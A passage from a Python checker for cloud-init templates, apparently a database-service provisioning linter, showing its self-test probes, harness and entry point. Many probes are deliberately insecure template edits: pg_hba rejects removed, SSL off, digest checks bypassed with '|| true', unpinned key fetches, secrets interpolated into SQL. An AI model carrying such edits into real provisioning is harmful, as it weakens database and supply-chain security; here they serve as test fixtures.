    P.append(("A unknown scope", "fault", dict(allow_add="gcp | top | runcmd:")))
    P.append(("A non-normalised entry", "fault", dict(allow_add="both | top | runcmd:  x")))
    P.append(("A duplicate entry", "red", dict(allow_dup=True)))
    P.append(("A entry in both allow and pending", "fault", dict(pend_dup=True)))
    P.append(("A malformed pending head", "fault", dict(pend_add="do-hive 4671 | top | x")))
    P.append(("A empty allowlist", "fault", dict(allow_text="# only a comment\n")))
    P.append(("A stale entry", "red", dict(allow_add="aws-gpu-burst | top | nothing-matches:", autolist=False)))
    P.append(("A stale both entry (one template only)", "red", dict(allow_add="both | " + PROV_PATH + " | echo only-in-aws > /x", aws=[ins(RELOAD, ["echo only-in-aws > /x"], before=True)], autolist=False)))
    P.append(("A stale pending entry", "red", dict(pend_add="do-hive #4671 | top | nothing-matches:", autolist=False)))
    P.append(("A fewer than two templates", "fault", dict(drop_do=True)))
    P.append(("A two templates in one directory", "fault", dict(add_template=("infra/aws-gpu-burst/cloud-init-memory-2.yaml.tpl", "aws"))))
    P.append(("A template with zero triggered lines", "fault", dict(do_text="")))
    # ---- do-hive template, fix round for PR 4671 (#4654): every probe mutates the do-hive template
    DBIN = "/usr/local/lib/ai-memory/bin/ai-memory"
    DDSN = PG + "aimemory:CHANGEME@localhost/aimemory?sslmode=verify-full&sslrootcert=/etc/ai-memory/tls/pg-ca.crt"
    DNOSSL = "            \"hostnossl all all all reject\" \\\n"
    DSSL = "printf '%s\\n' \"# ai-memory-tls (#4635)\" \"ssl = on\" \\\n"
    DHBA = "            \"hostssl aimemory aimemory 127.0.0.1/32 scram-sha-256\" \\\n"
    DSHA = "| sha256sum -c - \\\n          || { echo \"ai-memory tarball digest mismatch\"; rm -f \"$DL/ai-memory.tar.gz\"; exit 1; }\n"
    DTAR = "tar -xzf \"$DL/ai-memory.tar.gz\" --no-same-owner -C \"$DL/x\" ai-memory\n"

    def dred(label, muts, autolist=False, **kw):
        P.append((label, "red", dict(do=muts, autolist=autolist, **kw)))

    dred("D-4676 hostnossl reject narrowed to one role", [(DNOSSL, "            \"hostnossl aimemory aimemory all reject\" \\\n")], autolist=True)
    DREPL = '            "hostnossl replication all all reject" \\\n'
    HHEAD = "        { printf '%s\\n' \"# ai-memory-tls (#4635)\" \\\n"
    HCAT2 = '          cat "$HBA"; } > "$HBA.new"\n'
    HMUTS = (("packaged pg_hba lines written before the rejects", [(HHEAD, "        { cat \"$HBA\"; printf '%s\\n' \"# ai-memory-tls (#4635)\" \\\n"), (HCAT2, '          } > "$HBA.new"\n')]),
             ("rejects appended after the packaged file", [(HCAT2, HCAT2 + '        cat "$HBA" "$HBA.new" > "$HBA.new2"; mv "$HBA.new2" "$HBA.new"\n')]),
             ("replication reject removed, decoy line keeps the text", [('            "hostnossl replication all all reject" \\\n', ""), (HCAT2, HCAT2 + '        echo "hostnossl replication all all reject" >/dev/null\n')]))
    for hl, hm in HMUTS:
        dred("D-4784 " + hl, hm, autolist=True)
        red("S-4784 " + hl + " (aws)", hm)
    HSET = '      HBA="/etc/postgresql/18/main/pg_hba.conf"\n'
    HMVFI = '        mv "$HBA.new" "$HBA"\n      fi\n'
    HMUTS2 = (("mv over $HBA dropped (rejects never reach the live file)", [('        mv "$HBA.new" "$HBA"\n', "")]),
              ("whole pg_hba write inside if false", [(HSET, "      if false; then\n" + HSET), (HMVFI, HMVFI + "      fi\n")]),
              ("whole pg_hba write behind false &&", [(HSET, "      false && {\n" + HSET), (HMVFI, HMVFI + "      }\n")]),
              ("rejects written by one echo (one pg_hba line, no reject)", [(HHEAD, HHEAD.replace("{ printf '%s\\n'", "{ echo"))]),
              ("packaged sample copied over $HBA after the write", [(HMVFI, HMVFI + '      cp /usr/share/postgresql/18/pg_hba.conf.sample "$HBA"\n')]))
    for hl, hm in HMUTS2:
        dred("D-4784 " + hl, hm, autolist=True)
        red("S-4784 " + hl + " (aws)", hm)
    HGOOD = (("printf format double-quoted", [(HHEAD, HHEAD.replace("'%s\\n'", '"%s\\n"'))]),
             ("extra blanks in the cat and mv lines", [(HCAT2, '          cat  "$HBA";   } >  "$HBA.new"\n'), ('        mv "$HBA.new" "$HBA"\n', '        mv   "$HBA.new"  "$HBA"\n')]))
    for hl, hm in HGOOD:
        green("S-4784 correct edit: " + hl + " (aws)", hm, autolist=True)
        P.append(("D-4784 correct edit: " + hl, "green", dict(do=hm, autolist=True)))
    dred("D-4676 replication reject line deleted", [(DREPL, "")], autolist=True)
    dred("D-4676 replication reject turned into an accept", [(DREPL, '            "hostnossl replication all all scram-sha-256" \\\n')], autolist=True)
    dred("D-4676 replication reject narrowed to one role", [(DREPL, '            "hostnossl replication postgres all reject" \\\n')], autolist=True)
    DHCAT = '          cat "$HBA"; } > "$HBA.new"\n'
    dred("D-4676 replication reject moved after the packaged lines", [(DREPL, ""), (DHCAT, '          cat "$HBA"\n          printf \'%s\\n\' "hostnossl replication all all reject"; } > "$HBA.new"\n')], autolist=True)
    dred("D-4676 replication reject only inside if false", [(DREPL, ""), (DHCAT, DHCAT + '          if false; then echo "hostnossl replication all all reject"; fi\n')], autolist=True)
    dred("D-4676 all-roles reject only on a no-op command", [(DNOSSL, ""), (DHCAT, DHCAT + '          : "hostnossl all all all reject"\n')], autolist=True)
    dred("D-4676 hostnossl reject line deleted", [(DNOSSL, "")], autolist=True)
    dred("D-4676 hostnossl reject turned into an accept", [(DNOSSL, "            \"hostnossl all all all scram-sha-256\" \\\n")], autolist=True)
    dred("D-4704 ssl = off with ssl = on only in a comment", [(DSSL, "# ssl = on\n        printf '%s\\n' \"# ai-memory-tls (#4635)\" \"ssl = off\" \\\n")], autolist=True)
    dred("D-4704 hostssl turned into host for the aimemory role", [(DHBA, "            \"host aimemory aimemory 127.0.0.1/32 scram-sha-256\" \\\n")], autolist=True)
    dred("D-4704 digest check ignored with || true (non-tar name)", [(DSHA, "| sha256sum -c - || true\n")], autolist=True)
    dred("D-4704 digest check ignored with || :", [(DSHA, "| sha256sum -c - || :\n")], autolist=True)
    dred("D-4702 store-url authority port with a leading zero", [(DDSN, DDSN.replace("@localhost/", "@localhost:06432/"))], autolist=True)
    dred("D-4702 store-url port= query key", [(DDSN, DDSN + "&port=6432")], autolist=True)
    dred("D-4702 store-url host= query key", [(DDSN, DDSN + "&host=db.example.com")], autolist=True)
    dred("D-4702 provision writes a second store URL", [(RELOAD, "      printf '%s\\n' '" + PG + "aimemory:x@127.0.0.1:6432/aimemory?sslmode=verify-full' > /etc/ai-memory/store-url\n" + RELOAD)], autolist=True)
    dred("D-4705 SQL E-string password literal with a terraform value", [(RELOAD, "      sudo -u postgres psql -c \"ALTER USER aimemory WITH PASSWORD E'$${db_password}';\"\n" + RELOAD)], autolist=True)
    dred("D-4705 SQL dollar-quoted password literal with a terraform value", [(RELOAD, "      sudo -u postgres psql -c 'ALTER USER aimemory WITH PASSWORD $$${db_password}$$;'\n" + RELOAD)], autolist=True)
    dred("D-4705 SQL password literal with a prefix before the terraform value", [(RELOAD, "      sudo -u postgres psql -c \"ALTER USER aimemory WITH PASSWORD 'pre$${db_password}';\"\n" + RELOAD)], autolist=True)
    dred("D-4671 terraform secret interpolated into the store-url", [(DDSN, DDSN.replace("CHANGEME", "$${db_password}"))], autolist=True)
    dred("D-4677 channel_binding in the store-url", [(DDSN, DDSN + "&channel_binding=require")], autolist=True)
    dred("D-4712 unit binary under the service user home", [("ExecStart=" + DBIN + " serve", "ExecStart=/var/lib/ai-memory/bin/ai-memory serve")], autolist=True)
    dred("D-4712 unit binary back under /opt/ai-memory", [("ExecStart=" + DBIN + " serve", "ExecStart=/opt/ai-memory/bin/ai-memory serve")])
    dred("D-4712 expanded command word in the identity step", [("          " + DBIN + " identity generate", "          \"$BIN\" identity generate")], autolist=True)
    dred("D-4674 root-run bootstrap script under the service user home", [("ExecStart=/usr/local/sbin/ai-memory-fed-bootstrap.sh", "ExecStart=/var/lib/ai-memory/fed-bootstrap.sh")])
    dred("D-4673 tarball extracted into the binary directory", [(DTAR, "tar -xzf \"$DL/ai-memory.tar.gz\" --no-same-owner -C /usr/local/lib/ai-memory/bin\n")])
    dred("D-4675 CA key written to the persistent TLS directory", [("PGCA=/run/ai-memory-pgca\n", "PGCA=/etc/ai-memory/tls\n")])
    dred("D-4675 CA key wipe removed", [("      trap wipe_pgca EXIT\n", "")])
    dred("D-4805 PGDG key pin item without set -e", [("set -e; install -d -m 0755 /usr/share/postgresql-common/pgdg; rm -f", "install -d -m 0755 /usr/share/postgresql-common/pgdg; rm -f")], autolist=True)
    dred("D-4805 PGDG key fetched with no sha256sum pin", [(" | sha256sum -c -;", " | cat;")], autolist=True)
    dred("D-4707 provision line de-indented below the block but inside it", [("      systemctl daemon-reload\n      # TLS is universal", "     systemctl daemon-reload\n      # TLS is universal")])
    P.append(("A real templates (green control)", "green", dict(autolist=False)))
    return P


def apply_muts(text: str, muts) -> str:
    for old, new in muts:
        if old not in text:
            raise RuntimeError("self-test fixture drift: %r not in the template" % old[:60])
        text = text.replace(old, new, 1)
    return text


def case_inputs(base: tuple, spec: dict):
    """Return run_scan arguments for one probe spec."""
    templates, maintfs, allow, pend = base
    t = dict(templates)
    t[AWS_TEMPLATE] = apply_muts(t[AWS_TEMPLATE], spec.get("aws", ()))
    t[DO_TEMPLATE] = apply_muts(t[DO_TEMPLATE], spec.get("do", ()))
    if "do_text" in spec:
        t[DO_TEMPLATE] = spec["do_text"]
    if spec.get("drop_do"):
        del t[DO_TEMPLATE]
    if "add_template" in spec:
        nm, src = spec["add_template"]
        t[nm] = templates[AWS_TEMPLATE] if src == "aws" else templates[AWS_TEMPLATE]
    mt = dict(maintfs)
    if "maintf_sub" in spec:
        old, new = spec["maintf_sub"]
        if old not in mt["aws-gpu-burst"]:
            raise RuntimeError("self-test fixture drift in aws main.tf")
        mt["aws-gpu-burst"] = mt["aws-gpu-burst"].replace(old, new, 1)
    a = spec.get("allow_text", allow)
    if "allow_add" in spec:
        a = a + spec["allow_add"] + "\n"
    first = next(x for x in allow.splitlines() if x and not x.startswith("#"))
    if spec.get("allow_dup"):
        a = a + first + "\n"
    p = pend
    if spec.get("pend_dup"):
        p = p + first.split(" | ", 1)[0] + " #4671 | " + first.split(" | ", 1)[1] + "\n"
    if "pend_add" in spec:
        p = p + spec["pend_add"] + "\n"
    return t, mt, a, p, spec.get("autolist", False), spec.get("extra", ())


def verdict(hits: list, faults: list, spec: dict) -> str:
    if faults:
        return "fault"
    core = [h for h in hits if "stale entry" not in h and "not in the allowlist" not in h] if spec.get("autolist") or spec.get("core") else hits
    return "red" if core else "green"


def entry_mutations(base: tuple, cache: dict) -> list:
    """Condition 4: for every allow entry, a template whose first matching line
    has ' #m' appended to its last physical line."""
    templates, _, allow, _ = base
    out = []
    by_scope = {scope_of(nm): nm for nm in templates}
    tf_seen = {}
    for raw in allow.splitlines():
        if not raw or raw.startswith("#"):
            continue
        sc, ctx, line = raw.split(" | ", 2)
        nm = by_scope["aws-gpu-burst" if sc == "both" else sc]
        if ctx == "tf-region":
            k = tf_seen.get(nm, 0)
            tf_seen[nm] = k + 1
            spans = tf_region_spans(templates[nm])
            if k >= len(spans) or tf_regions(templates[nm])[k] != line:
                raise RuntimeError("self-test: tf-region entry %d matches no region in order: %s" % (k + 1, raw[:80]))
            phys = templates[nm].split("\n")
            a, b = spans[k]
            body = [x for x in range(a, b + 1) if DIRECTIVE_LINE_RE.match(phys[x]) is None]
            at = body[-1] if body else a
            phys[at] = phys[at] + " #m" if body else "%{ if true }"
            out.append((raw, nm, "\n".join(phys)))
            continue
        lines, _, _, trig, _ = analyse(nm, templates[nm], cache)
        ln = next((x for x in trig if x.ctx == ctx and x.text == line), None)
        if ln is None:
            raise RuntimeError("self-test: allow entry matches nothing: " + raw[:80])
        phys = templates[nm].split("\n")
        phys[ln.last - 1] = phys[ln.last - 1] + " #m"
        out.append((raw, nm, "\n".join(phys)))
    return out


def self_test(known: set) -> int:
    base = load_repo()
    cache = {}
    bad, counts = [], {"red": 0, "green": 0, "fault": 0}
    for label, expect, spec in build_probes():
        t, mt, a, p, auto, extra = case_inputs(base, spec)
        hits, faults, _ = run_scan(t, mt, a, p, known, autolist=auto, extra=extra, cache=cache)
        got = verdict(hits, faults, spec)
        counts[expect] += 1
        if got != expect:
            bad.append("%s: expected %s, got %s %s" % (label, expect, got, (faults or hits or [""])[0][:140]))
    muts = entry_mutations(base, cache)
    for raw, nm, text in muts:
        t = dict(base[0])
        t[nm] = text
        hits, faults, _ = run_scan(t, base[1], base[2], base[3], known, cache=cache)
        want = "| tf-region: " if " | tf-region | " in raw else "not in the allowlist"
        if faults or not any(want in h for h in hits):
            bad.append("entry mutation stayed green: " + raw[:100])
    with contextlib.redirect_stderr(io.StringIO()):
        try:
            build_parser().parse_args(["--bogus"])
            bad.append("a mistyped argument was accepted")
        except SystemExit as exc:
            if exc.code != 2:
                bad.append("a mistyped argument exited %r, not 2" % exc.code)
    if bad:
        print("\n".join("SELF-TEST FAIL: " + b for b in bad), file=sys.stderr)
        return 1
    print("SELF-TEST PASS: %d red probes flagged, %d green probes clean, %d form faults raised, %d/%d allow-entry mutations red, mistyped argument exits 2"
          % (counts["red"], counts["green"], counts["fault"], len(muts), len(muts)))
    return 0


def main(argv: list) -> int:
    args = build_parser().parse_args(argv[1:])
    try:
        known = serve_flags(SERVE_SRC.read_text(encoding="utf-8"))
        if args.self_test:
            return self_test(known)
        templates, maintfs, allow, pend = load_repo()
        if args.list_triggers:
            print("\n".join(list_triggers(templates, {})))
            return 0
        hits, faults, stats = run_scan(templates, maintfs, allow, pend, known)
    except (OSError, RuntimeError, UnicodeDecodeError) as exc:
        print("FAULT: %s" % exc, file=sys.stderr)
        return 2
    if faults:
        print("\n".join("FAULT: " + f for f in faults), file=sys.stderr)
        if hits:
            print("\n".join(hits), file=sys.stderr)
        return 2
    if hits:
        print("\n".join(hits), file=sys.stderr)
        print("FAIL: %d cloud-init template defect(s)" % len(hits), file=sys.stderr)
        print("  list the changed approved lines: scripts/regen-cloud-init-token-allow.py <repo-root>; after review, rerun it with --accept-new and review its diff", file=sys.stderr)
        return 1
    print("PASS: %d templates, %d allow entries, %d pending entries, %d triggered lines, %d serve flags known"
          % (stats["templates"], stats["allow"], stats["pending"], stats["triggered"], len(known)))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
